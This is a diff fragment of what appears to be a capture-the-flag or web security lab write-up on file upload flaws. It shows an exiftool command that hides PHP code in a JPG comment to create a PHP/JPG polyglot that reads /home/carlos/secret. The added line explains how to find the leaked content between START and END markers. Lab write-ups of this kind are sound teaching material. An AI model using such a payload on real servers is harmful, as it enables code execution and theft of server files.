@@ -76,6 +76,7 @@ Create a polyglot PHP/JPG file that is fundamentally a normal image, but contain
 ```
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
 ```
+To see requested content, just search START keyword in response and you will find that requested thing is consisted between START and END
 
 ---
 
